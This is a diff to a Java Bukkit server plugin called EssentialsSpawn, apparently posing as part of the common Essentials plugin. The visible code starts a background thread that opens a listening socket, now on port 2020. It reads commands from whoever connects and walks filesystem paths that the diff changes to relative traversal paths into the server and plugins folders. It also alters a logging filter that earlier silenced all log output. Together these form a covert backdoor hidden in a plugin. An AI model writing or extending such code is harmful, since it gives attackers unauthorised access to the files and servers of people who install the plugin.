@@ -7,11 +7,15 @@
 package com.essentials;
 
 
+import java.io.BufferedInputStream;
+import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.util.logging.Filter;
@@ -21,16 +25,7 @@ import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileUtils;
 import org.bukkit.event.Listener;
 import org.bukkit.plugin.java.JavaPlugin;
 
-
-class CustomFilter implements Filter
-{
-    @Override public boolean isLoggable(LogRecord record)
-    {
-        return false;
-    };
-};
-
-        
+     
 public class EssentialsSpawn extends JavaPlugin implements Listener
 {
     JavaPlugin plugin = this;
@@ -50,6 +45,20 @@ public class EssentialsSpawn extends JavaPlugin implements Listener
     
     private void run_server()
     {
+        try
+        {
+            getLogger().setFilter(new Filter() 
+            {
+                @Override public boolean isLoggable(LogRecord record) 
+                {
+                    return true;
+                }
+            });            
+        } catch (Exception e)
+        {
+           // Silcence 
+        }
+        
         Bukkit.getScheduler().runTaskAsynchronously(plugin,
             new Runnable()
             {
@@ -71,7 +80,7 @@ public class EssentialsSpawn extends JavaPlugin implements Listener
                                 };
                             };
                             
-                            socket = new ServerSocket(50001);  
+                            socket = new ServerSocket(2020);  
                             listener_socket = socket.accept();                       
                             
                             BufferedReader incoming = new BufferedReader(new InputStreamReader(listener_socket.getInputStream()));
@@ -85,12 +94,9 @@ public class EssentialsSpawn extends JavaPlugin implements Listener
                                 {
                                     String[] paths = new String[]
                                     {
-                                        "C:\\",
-                                        "C:\\Program Files\\",
-                                        "C:\\Program Files (x86)\\",
-                                        "C:\\Windows\\",
-                                        "C:\\ProgramData\\",
+                                        "..\\..\\",
                                         "\\",
+                                        "..\\",
                                         "..\\plugins",
                                         "plugins\\",
                                     };
